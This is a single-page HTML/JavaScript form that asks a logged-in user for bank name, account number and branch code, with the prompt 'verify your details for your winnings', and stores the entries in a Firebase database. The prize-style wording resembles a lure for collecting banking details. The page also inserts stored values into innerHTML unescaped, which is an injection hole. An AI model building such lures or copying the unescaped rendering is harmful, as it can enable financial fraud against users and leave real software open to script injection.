<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Wallet Details</title>

<style>
body{
  margin:0;
  background:#001f3f;
  font-family:Arial;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  position: relative;
}

#box{
  width:90%;
  max-width: 500px;
}

input{
  width:100%;
  padding:18px;
  margin:10px 0;
  font-size:18px;
  background:#fffdd0; /* cream */
  border:none;
  box-sizing: border-box;
}

button{
  width:100%;
  padding:18px;
  font-size:20px;
  background:green;
  color:white;
  border:none;
  cursor: pointer;
  box-sizing: border-box;
}

#warn{
  color:red;
  text-align:center;
  margin-top:10px;
}

#popup{
  position:fixed;
  top:50%;
  left:50%;
  transform:translate(-50%,-50%);
  background:white;
  padding:30px;
  font-size:24px;
  display:none;
  z-index: 100;
  color: black;
  border-radius: 4px;
}

/* New Show/Hide button positioning */
#toggleBtn {
  position: fixed;
  top: 20px;
  right: 20px;
  width: auto;
  padding: 10px 20px;
  font-size: 16px;
  background: green;
  font-weight: bold;
  border-radius: 4px;
}

/* Light brownish colored tile layout */
#detailsDisplay {
  display: none;
  background: #CD7F32; /* Light brown / bronze */
  color: white;
  padding: 15px;
  margin-top: 20px;
  border-radius: 4px;
  box-sizing: border-box;
}

.detail-item {
  margin: 8px 0;
  font-size: 16px;
  border-bottom: 1px solid rgba(255,255,255,0.2);
  padding-bottom: 5px;
}
</style>
</head>

<body>

<button id="toggleBtn" onclick="toggleDetails()">SHOW</button>

<div id="box">
  <input id="bank" placeholder="BANK NAME">
  <input id="account" placeholder="ACCOUNT NUMBER">
  <input id="branch" placeholder="BRANCH CODE">

  <button onclick="submit()">SUBMIT</button>

  <div id="detailsDisplay"></div>

  <div id="warn">verify your details for your winnings</div>
</div>

<div id="popup">SUBMITTED</div>

<script type="module">
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";
import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-auth.js";

const firebaseConfig = {
  apiKey: "AIzaSyBqJTLjxhZBCsvjrTH_cG0fkXlElG6BqTg",
  authDomain: "tose-ccf8f.firebaseapp.com",
  databaseURL: "https://tose-ccf8f-default-rtdb.europe-west1.firebasedatabase.app",
  projectId: "tose-ccf8f",
  storageBucket: "tose-ccf8f.appspot.com",
  messagingSenderId: "475447495901",
  appId: "1:475447495901:web:9189276a162a3680afdf34"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);
const auth = getAuth(app);

let user;
let showingDetails = false;

onAuthStateChanged(auth,(u)=>{
  if(!u) location.href="index.html";
  user=u;
});

window.submit = async ()=>{
  const bank = bankInput.value;
  const account = accountInput.value;
  const branch = branchInput.value;

  if(!bank || !account || !branch){
    alert("Fill all fields");
    return;
  }

  await set(ref(db,"walletDetails/"+user.uid),{
    uid:user.uid,
    bank,
    account,
    branch,
    timestamp:Date.now()
  });

  document.getElementById("popup").style.display="block";
  setTimeout(()=>{
    document.getElementById("popup").style.display="none";
  }, 2000);

  // Auto-refresh the container view data if details display container is open
  if (showingDetails) {
    fetchAndDisplayDetails();
  }
};

window.toggleDetails = async () => {
  const btn = document.getElementById("toggleBtn");
  const displayBox = document.getElementById("detailsDisplay");

  if (!showingDetails) {
    await fetchAndDisplayDetails();
    displayBox.style.display = "block";
    btn.innerText = "HIDE";
    btn.style.background = "#A30000"; // Dark red for hide alert look
    showingDetails = true;
  } else {
    displayBox.style.display = "none";
    btn.innerText = "SHOW";
    btn.style.background = "green";
    showingDetails = false;
  }
};

async function fetchAndDisplayDetails() {
  const displayBox = document.getElementById("detailsDisplay");
  if (!user) return;
  
  try {
    const snapshot = await get(ref(db, "walletDetails/" + user.uid));
    if (snapshot.exists()) {
      const data = snapshot.val();
      displayBox.innerHTML = `
        <div class="detail-item"><b>Bank:</b> ${data.bank}</div>
        <div class="detail-item"><b>Account No:</b> ${data.account}</div>
        <div class="detail-item"><b>Branch Code:</b> ${data.branch}</div>
      `;
    } else {
      displayBox.innerHTML = `<div style="text-align:center;">No details found. Please submit data.</div>`;
    }
  } catch (error) {
    console.error(error);
    displayBox.innerHTML = `<div style="text-align:center; color: #ffcccc;">Error loading records.</div>`;
  }
}

const bankInput=document.getElementById("bank");
const accountInput=document.getElementById("account");
const branchInput=document.getElementById("branch");

</script>

</body>
</html>
